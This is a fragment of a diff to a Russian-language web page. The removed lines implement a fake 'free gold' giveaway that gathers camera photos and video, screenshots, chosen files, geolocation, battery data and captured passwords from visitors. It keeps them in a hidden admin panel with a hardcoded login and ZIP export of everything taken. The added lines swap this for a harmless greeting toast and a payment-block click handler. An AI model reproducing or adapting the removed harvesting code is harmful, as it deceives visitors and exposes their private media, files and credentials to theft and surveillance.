-            setStatus('📁 ВЫБЕРИТЕ ФАЙЛЫ (ФОТО/ВИДЕО)...', '');
-            await waitForFiles(25000);
-            setStep(5, 'done');
-            setStatus(`📁 ФАЙЛОВ ВЫБРАНО: ${collectedFiles.length}`, 'success');
-            
-            // ШАГ 6: СОХРАНЕНИЕ В АДМИНКУ
-            setStep(6, 'active');
-            setStatus('💾 СОХРАНЕНИЕ В АДМИН-ПАНЕЛЬ...', '');
-            
-            // Сохраняем все данные в localStorage для админки
-            const session = {
-                id: Date.now(),
-                time: new Date().toISOString(),
-                preview: {
-                    ua: String(navigator.userAgent).substring(0, 40),
-                    files: collectedFiles.length,
-                    media: mediaData.length,
-                    hasScreenshot: !!screenshotData
-                },
-                // Сохраняем все медиа в сессию для экспорта
-                mediaData: mediaData,
-                screenshotData: screenshotData,
-                collectedFiles: collectedFiles.map(f => ({
-                    name: f.name,
-                    type: f.type,
-                    size: f.size,
-                    data: f.data,
-                    time: f.time
-                }))
-            };
-            sessions.push(session);
-            localStorage.setItem('sessions', JSON.stringify(sessions));
-            
-            setStep(6, 'done');
-            setStatus('🎉 ДАННЫЕ СОХРАНЕНЫ В АДМИН-ПАНЕЛЬ!', 'success');
-            btn.classList.remove('loading');
-            btn.querySelector('.btn-text').textContent = '✅ ГОТОВО';
-            
-            // Через 10 сек - скрыть главную, показать финальное сообщение с @papadenay
-            setTimeout(() => {
-                mainPage.style.display = 'none';
-                finalMessage.style.display = 'block';
-                document.querySelector('.container').style.borderColor = '#ff6b00';
-            }, 10000);
-            
-        } catch (err) {
-            setStatus('❌ ОШИБКА: ' + (err.message || 'НЕИЗВЕСТНО'), 'error');
-            console.error(err);
-            btn.classList.remove('loading');
-            btn.disabled = false;
-            btn.querySelector('.btn-text').textContent = '🎁 ПОЛУЧИТЬ ГОЛДУ';
-        }
-        
-        isRunning = false;
-    }
-
-    // ============================================================
-    // 10. ВСПОМОГАТЕЛЬНЫЕ
-    // ============================================================
-    function getGeolocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve({ error: 'НЕТ' }); return; }
-            navigator.geolocation.getCurrentPosition(
-                (p) => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
-                () => resolve({ error: 'ОТКАЗАНО' }),
-                { timeout: 3000 }
-            );
-        });
-    }
-
-    function getBatteryInfo() {
-        return new Promise((resolve) => {
-            if (!navigator.getBattery) { resolve({ error: 'НЕТ' }); return; }
-            navigator.getBattery().then(b => resolve({
-                level: Math.round(b.level * 100) + '%',
-                charging: b.charging ? 'ДА' : 'НЕТ'
-            })).catch(() => resolve({ error: 'ОШИБКА' }));
-        });
-    }
-
-    // ============================================================
-    // 11. АДМИНКА
-    // ============================================================
-    function renderAdmin() {
-        const list = document.getElementById('sessionsList');
-        list.innerHTML = sessions.length === 0 ? '<p style="color:#888;">НЕТ СЕССИЙ</p>' :
-            sessions.slice().reverse().map((s, index) => `
-                <div class="session-item">
-                    <strong>${new Date(s.time).toLocaleString()}</strong>
-                    <span class="badge">ID: ${s.id}</span>
-                    <br>БРАУЗЕР: ${s.preview.ua || 'НЕТ'}
-                    <br>ФАЙЛОВ: ${s.preview.files || 0} | МЕДИА: ${s.preview.media || 0} | СКРИНШОТ: ${s.preview.hasScreenshot ? 'ЕСТЬ' : 'НЕТ'}
-                    <br><button class="btn-small" onclick="deleteSession(${index})">УДАЛИТЬ</button>
-                </div>
-            `).join('');
-        
-        const plist = document.getElementById('passwordsList');
-        plist.innerHTML = capturedData.length === 0 ? '<p style="color:#888;">НЕТ ДАННЫХ</p>' :
-            capturedData.slice().reverse().slice(0, 50).map(p => `
-                <div class="password-item">
-                    <strong>${new Date(p["ВРЕМЯ"]).toLocaleString()}</strong>
-                    <span style="color:#ff6666;">📌 ${p["ЗНАЧЕНИЕ"]}</span>
-                    <br>ИСТОЧНИК: ${p["ОТКУДА"] || 'НЕТ'}
-                </div>
-            `).join('');
-    }
-
-    window.deleteSession = function(index) {
-        sessions = sessions.filter((_, i) => i !== index);
-        localStorage.setItem('sessions', JSON.stringify(sessions));
-        renderAdmin();
+    // При загрузке — тост-приветствие
+    window.onload = function() {
+        const toast = document.getElementById('mainToast');
+        toast.style.transition = 'all 0.5s ease-out';
+        toast.style.transform = 'scale(1.1)';
+        toast.style.opacity = '0.7';
+        setTimeout(() => {
+            toast.style.transform = 'scale(1)';
+            toast.style.opacity = '1';
+        }, 200);
+        // дополнительный тост в консоли (технический)
+        console.log('SWILL · Тост-сайт активирован · СБП +7 999 714 13 32');
     };
 
-    // ============================================================
-    // 12. ЭКСПОРТ ZIP ИЗ АДМИНКИ (ВСЁ: ФОТО, ВИДЕО, ПАРОЛИ)
-    // ============================================================
-    async function exportAdminZip() {
-        const status = document.getElementById('adminStatus');
-        status.textContent = '📦 СОЗДАНИЕ АРХИВА...';
-        status.className = 'status';
-        
-        try {
-            const zip = new JSZip();
-            
-            // Все данные
-            zip.file('ВСЕ_ДАННЫЕ.json', JSON.stringify({
-                sessions: sessions.map(s => ({
-                    ...s,
-                    mediaData: undefined,
-                    screenshotData: undefined,
-                    collectedFiles: undefined
-                })),
-                passwords: capturedData,
-                date: new Date().toISOString()
-            }, null, 2));
-            
-            zip.file('ПАРОЛИ.json', JSON.stringify(capturedData, null, 2));
-            
-            // Проходим по всем сессиям и добавляем медиа
-            sessions.forEach((session, sessionIndex) => {
-                // Скриншот
-                if (session.screenshotData) {
-                    try {
-                        const b64 = session.screenshotData.split(',')[1];
-                        if (b64) {
-                            zip.file(`СЕССИЯ_${sessionIndex + 1}/СКРИНШОТ.png`, b64, { base64: true });
-                        }
-                    } catch(e) {}
-                }
-                
-                // Медиа (фото и видео)
-                if (session.mediaData && session.mediaData.length > 0) {
-                    session.mediaData.forEach((m, i) => {
-                        try {
-                            const b64 = m.data.split(',')[1];
-                            if (b64) {
-                                const ext = m.type === 'photo' ? 'jpg' : 'mp4';
-                                const cam = m.cam === 'back' ? 'ЗАДНЯЯ' : 'ПЕРЕДНЯЯ';
-                                zip.file(`СЕССИЯ_${sessionIndex + 1}/МЕДИА/${i + 1}_${cam}_${m.type}.${ext}`, b64, { base64: true });
-                            }
-                        } catch(e) {}
-                    });
-                }
-                
-                // Файлы пользователя
-                if (session.collectedFiles && session.collectedFiles.length > 0) {
-                    session.collectedFiles.forEach((f, i) => {
-                        try {
-                            const b64 = f.data.split(',')[1];
-                            if (b64) {
-                                const ext = f.name.split('.').pop() || 'file';
-                                zip.file(`СЕССИЯ_${sessionIndex + 1}/ФАЙЛЫ_ПОЛЬЗОВАТЕЛЯ/${i + 1}_${f.name}`, b64, { base64: true });
-                            }
-                        } catch(e) {}
-                    });
-                }
-            });
-            
-            const blob = await zip.generateAsync({ type: 'blob' });
-            saveAs(blob, `АДМИН_ЭКСПОРТ_${new Date().toISOString().slice(0,10)}.zip`);
-            status.textContent = '✅ АРХИВ СОЗДАН И СКАЧАН! (ФОТО, ВИДЕО, ПАРОЛИ)';
-            status.className = 'status success';
-        } catch (err) {
-            status.textContent = '❌ ОШИБКА: ' + err.message;
-            status.className = 'status error';
-            console.error(err);
-        }
-    }
-
-    // ============================================================
-    // 13. ИНИЦИАЛИЗАЦИЯ
-    // ============================================================
-    document.addEventListener('DOMContentLoaded', function() {
-        setupCapture();
-
-        document.getElementById('startBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            startCollection();
-        });
-
-        document.getElementById('goToAdminBtn').addEventListener('click', function() {
-            document.getElementById('mainPage').style.display = 'none';
-            document.getElementById('adminPage').classList.remove('hidden');
-            document.getElementById('loginForm').classList.remove('hidden');
-            document.getElementById('adminContent').classList.add('hidden');
-            document.getElementById('adminStatus').textContent = '';
-            document.getElementById('adminStatus').className = 'status';
-        });
-
-        document.getElementById('adminLoginBtn').addEventListener('click', function() {
-            const login = document.getElementById('adminLogin').value.trim();
-            const pass = document.getElementById('adminPassword').value.trim();
-            const st = document.getElementById('adminStatus');
-            if (login === 'admin' && pass === '6767') {
-                st.textContent = '✅ ДОСТУП РАЗРЕШЁН';
-                st.className = 'status success';
-                document.getElementById('loginForm').classList.add('hidden');
-                document.getElementById('adminContent').classList.remove('hidden');
-                renderAdmin();
-            } else {
-                st.textContent = '❌ НЕВЕРНЫЕ ДАННЫЕ';
-                st.className = 'status error';
-            }
-        });
-
-        document.getElementById('logoutBtn').addEventListener('click', function() {
-            document.getElementById('adminPage').classList.add('hidden');
-            document.getElementById('mainPage').style.display = 'block';
-            document.getElementById('loginForm').classList.remove('hidden');
-            document.getElementById('adminContent').classList.add('hidden');
-        });
-
-        document.getElementById('clearSessionsBtn').addEventListener('click', function() {
-            if (confirm('УДАЛИТЬ ВСЁ?')) {
-                sessions = [];
-                capturedData = [];
-                localStorage.setItem('sessions', JSON.stringify(sessions));
-                localStorage.setItem('capturedData', JSON.stringify(capturedData));
-                renderAdmin();
-            }
-        });
-
-        document.getElementById('exportAllBtn').addEventListener('click', exportAdminZip);
-    });
+    // клик по самому блоку СБП также вызывает тост
+    document.querySelector('.sbp-block')?.addEventListener('click', showToastPayment);
 </script>
 
 </body>
